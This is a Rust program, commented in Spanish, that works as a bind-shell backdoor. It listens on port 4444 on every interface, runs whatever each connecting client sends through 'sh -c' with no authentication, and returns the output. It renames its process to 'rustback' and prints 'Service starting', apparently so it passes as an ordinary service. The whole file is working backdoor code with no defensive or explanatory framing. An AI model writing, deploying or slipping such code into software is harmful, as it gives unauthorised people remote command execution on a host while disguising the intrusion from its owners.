use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::process::Command;
use capctl::prctl;

fn set_process_name() {
    prctl::set_name("rustback").expect("Failed to set process name"); // Nombre del servicio
}

async fn handle_client(stream: TcpStream) {
    let (reader, mut writer) = stream.into_split();  // Separamos la lectura y escritura
    let mut reader = BufReader::new(reader);
    let mut buffer = String::new();

    loop {
        buffer.clear();
        match reader.read_line(&mut buffer).await {
            Ok(0) => break, // Cliente desconectado
            Ok(_) => {
                let output = Command::new("sh") // Se indica la shell
                    .arg("-c")
                    .arg(&buffer.trim())
                    .output()
                    .await
                    .expect("Failed to execute command");

                let response = String::from_utf8_lossy(&output.stdout);
                writer.write_all(response.as_bytes()).await.expect("Failed to write to stream");
            }
            Err(_) => break,
        }
    }
}

#[tokio::main]
async fn main() {
    set_process_name();
    let listener = TcpListener::bind("0.0.0.0:4444").await.expect("Failed to bind to address");
    println!("Service starting"); // Mensaje del servicio

    loop {
        let (stream, _) = listener.accept().await.expect("Failed to accept connection");
        tokio::spawn(async move {
            handle_client(stream).await;
        });
    }
}
